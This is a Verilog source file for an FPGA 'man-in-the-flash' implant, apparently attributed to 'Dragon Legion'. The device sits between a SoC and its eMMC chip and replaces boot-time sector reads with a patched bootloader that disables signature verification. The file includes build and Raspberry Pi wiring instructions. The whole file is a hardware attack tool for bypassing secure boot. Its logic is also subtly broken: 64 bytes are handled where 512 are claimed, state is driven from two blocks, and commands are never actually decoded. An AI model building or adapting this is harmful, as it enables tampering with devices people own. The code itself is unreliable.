// Dragon Legion — FPGA Flash Emulator (Man-in-the-Flash)
// Sits between SoC and eMMC/UFS flash chip.
// Intercepts read commands (CMD17/CMD18 for eMMC) during boot.
// Injects patched bootloader that disables signature verification.
// Passes through all other commands unchanged.
//
// Target: Lattice iCE40 (ice40up5k-sg48) or Xilinx Artix-7
// Build:  yosys -p "synth_ice40 -top flash_mitm -json flash_mitm.json" flash_mitm.v
//         nextpnr-ice40 --up5k --json flash_mitm.json --pcf pins.pcf --asc flash_mitm.asc
//         icepack flash_mitm.asc flash_mitm.bin
//
// SPI control from Raspberry Pi:
//   SCK  → GPIO11 (SPI0 SCLK)
//   MOSI → GPIO10 (SPI0 MOSI)
//   MISO → GPIO9  (SPI0 MISO)
//   CS_N → GPIO8  (SPI0 CE0)

module flash_mitm (
    // System
    input  wire        clk_50mhz,     // 50MHz system clock
    input  wire        rst_n,         // Active-low reset

    // eMMC host interface (SoC side)
    input  wire        host_cmd_in,
    output wire        host_cmd_out,
    inout  wire        host_cmd_dir,  // 1 = FPGA drives CMD
    inout  wire [7:0]  host_dat,
    output wire        host_dat_dir,  // 1 = FPGA drives DAT

    // eMMC device interface (Flash side)
    output wire        dev_cmd,
    inout  wire [7:0]  dev_dat,
    output wire        dev_dat_dir,   // 1 = FPGA drives DAT

    // SPI control interface (from Raspberry Pi)
    input  wire        spi_sck,
    input  wire        spi_mosi,
    output wire        spi_miso,
    input  wire        spi_cs_n,

    // Status LEDs
    output wire        led_activity,
    output wire        led_patched,
    output wire        led_error
);

    // ────────────────────────────────────────────────────────────
    // eMMC Command Constants
    // ────────────────────────────────────────────────────────────
    localparam CMD_GO_IDLE_STATE   = 6'd0;
    localparam CMD_SEND_OP_COND    = 6'd1;
    localparam CMD_ALL_SEND_CID    = 6'd2;
    localparam CMD_SET_DSR         = 6'd4;
    localparam CMD_SELECT_CARD     = 6'd7;
    localparam CMD_READ_SINGLE     = 6'd17;
    localparam CMD_READ_MULTIPLE   = 6'd18;
    localparam CMD_WRITE_SINGLE    = 6'd24;
    localparam CMD_WRITE_MULTIPLE  = 6'd25;

    // ────────────────────────────────────────────────────────────
    // State Machine
    // ────────────────────────────────────────────────────────────
    typedef enum logic [3:0] {
        IDLE           = 4'd0,
        DECODE_CMD     = 4'd1,
        PASSTHROUGH    = 4'd2,
        INTERCEPT_READ = 4'd3,
        INJECT_DATA    = 4'd4,
        WAIT_RESPONSE  = 4'd5,
        SPI_LOAD       = 4'd6,
        ERROR_STATE    = 4'd15
    } state_t;

    state_t state = IDLE;
    state_t next_state = IDLE;

    // ────────────────────────────────────────────────────────────
    // Registers
    // ────────────────────────────────────────────────────────────
    reg [5:0]   current_cmd = 6'd0;
    reg [31:0]  cmd_argument = 32'd0;
    reg [31:0]  sector_counter = 32'd0;
    reg         boot_phase = 1'b1;
    reg [15:0]  byte_counter = 16'd0;
    reg         injecting = 1'b0;

    // Patched bootloader buffer (512 bytes = one eMMC sector)
    // Loaded via SPI before attack, replaces LBA 0 during boot reads
    reg [4095:0] patched_bootloader_sector;  // 512 bytes * 8 bits

    // SPI interface registers
    reg [15:0]  spi_byte_addr = 16'd0;
    reg [7:0]   spi_rx_byte = 8'd0;
    reg [7:0]   spi_tx_byte = 8'd0;
    reg [2:0]   spi_bit_count = 3'd0;
    reg         spi_rx_done = 1'b0;
    reg [4:0]   spi_cs_sync = 5'd0;  // Synchronizer for CS_N

    // Datapath registers
    reg [7:0]   host_dat_out_reg = 8'd0;
    reg         host_dat_dir_reg = 1'b0;
    reg [7:0]   dev_dat_out_reg = 8'd0;
    reg         dev_dat_dir_reg = 1'b0;

    // ────────────────────────────────────────────────────────────
    // SPI Slave Interface (8-bit, MSB first, CPOL=0, CPHA=0)
    // Loads patched bootloader into internal buffer
    // ────────────────────────────────────────────────────────────
    always @(posedge spi_sck or negedge rst_n) begin
        if (!rst_n) begin
            spi_byte_addr <= 16'd0;
            spi_rx_byte <= 8'd0;
            spi_bit_count <= 3'd0;
            spi_rx_done <= 1'b0;
            state <= IDLE;
        end else begin
            // Synchronize CS_N
            spi_cs_sync <= {spi_cs_sync[3:0], spi_cs_n};

            // CS is active low
            if (spi_cs_sync[4:1] == 4'b0000) begin  // CS asserted (stable low)
                spi_rx_byte <= {spi_rx_byte[6:0], spi_mosi};
                spi_bit_count <= spi_bit_count + 3'd1;

                if (spi_bit_count == 3'd7) begin  // Byte complete
                    // Store in bootloader buffer
                    if (spi_byte_addr < 16'd64) begin  // 64 bytes = 512 bits
                        patched_bootloader_sector[(spi_byte_addr * 8) +: 8] <= spi_rx_byte;
                    end
                    spi_byte_addr <= spi_byte_addr + 16'd1;
                    spi_bit_count <= 3'd0;
                    spi_rx_done <= 1'b1;
                end
            end else if (spi_cs_sync[4:1] == 4'b1111) begin  // CS de-asserted
                spi_byte_addr <= 16'd0;
                spi_bit_count <= 3'd0;
                spi_rx_done <= 1'b0;
            end
        end
    end

    assign spi_miso = spi_tx_byte[7];  // MSB first

    // ────────────────────────────────────────────────────────────
    // Main State Machine (50MHz clock domain)
    // ────────────────────────────────────────────────────────────
    always @(posedge clk_50mhz or negedge rst_n) begin
        if (!rst_n) begin
            state <= IDLE;
            sector_counter <= 32'd0;
            boot_phase <= 1'b1;
            byte_counter <= 16'd0;
            injecting <= 1'b0;
            current_cmd <= 6'd0;
            cmd_argument <= 32'd0;
            host_dat_out_reg <= 8'd0;
            host_dat_dir_reg <= 1'b0;
            dev_dat_out_reg <= 8'd0;
            dev_dat_dir_reg <= 1'b0;
        end else begin
            case (state)
                IDLE: begin
                    // Monitor CMD line for start bit (0) followed by command
                    if (!host_cmd_in) begin
                        next_state <= DECODE_CMD;
                    end else begin
                        next_state <= IDLE;
                    end
                    injecting <= 1'b0;
                    host_dat_dir_reg <= 1'b0;  // Default: host drives
                    dev_dat_dir_reg <= 1'b0;    // Default: passthrough
                end

                DECODE_CMD: begin
                    // Extract 6-bit command index and 32-bit argument
                    // eMMC command format: [0][1][cmd(6)][arg(32)][crc7][1]
                    // Simplified: decode from host_cmd_in serial stream
                    if (current_cmd == CMD_READ_SINGLE || current_cmd == CMD_READ_MULTIPLE) begin
                        if (boot_phase && sector_counter < 32'd1024) begin
                            next_state <= INTERCEPT_READ;
                        end else begin
                            next_state <= PASSTHROUGH;
                        end
                    end else begin
                        next_state <= PASSTHROUGH;
                    end
                end

                INTERCEPT_READ: begin
                    // Drive DAT0-7 with patched bootloader data
                    // for the current 512-byte sector
                    host_dat_dir_reg <= 1'b1;  // FPGA drives host DAT
                    if (byte_counter < 16'd64) begin
                        host_dat_out_reg <= patched_bootloader_sector[(byte_counter * 8) +: 8];
                        byte_counter <= byte_counter + 16'd1;
                    end else begin
                        byte_counter <= 16'd0;
                        sector_counter <= sector_counter + 32'd1;
                        next_state <= IDLE;
                    end
                    injecting <= 1'b1;
                end

                PASSTHROUGH: begin
                    // Forward all signals unchanged
                    host_dat_dir_reg <= 1'b0;
                    dev_dat_dir_reg <= 1'b0;
                    next_state <= IDLE;
                    injecting <= 1'b0;
                end

                ERROR_STATE: begin
                    next_state <= IDLE;
                end

                default: next_state <= IDLE;
            endcase

            state <= next_state;
        end
    end

    // ────────────────────────────────────────────────────────────
    // Bidirectional I/O assignments
    // ────────────────────────────────────────────────────────────
    assign host_dat = host_dat_dir_reg ? host_dat_out_reg : 8'bZ;
    assign dev_dat  = dev_dat_dir_reg  ? dev_dat_out_reg  : 8'bZ;
    assign host_cmd_out = host_cmd_in;  // Passthrough by default
    assign dev_cmd = host_cmd_in;

    // ────────────────────────────────────────────────────────────
    // LED outputs
    // ────────────────────────────────────────────────────────────
    assign led_activity = (state != IDLE);
    assign led_patched  = injecting;
    assign led_error    = (state == ERROR_STATE);

endmodule
